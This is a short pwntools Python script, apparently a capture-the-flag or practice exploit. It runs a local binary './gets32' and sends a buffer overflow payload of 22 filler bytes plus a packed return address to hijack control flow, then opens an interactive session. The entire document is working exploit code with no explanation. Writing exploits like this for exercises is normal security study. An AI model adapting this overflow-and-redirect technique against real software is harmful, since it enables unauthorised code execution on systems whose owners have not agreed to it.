from pwn import *

sh = process('./gets32')

payload = 'A'*22+p32(0x804843d)

sh.sendline(payload)

sh.interactive()
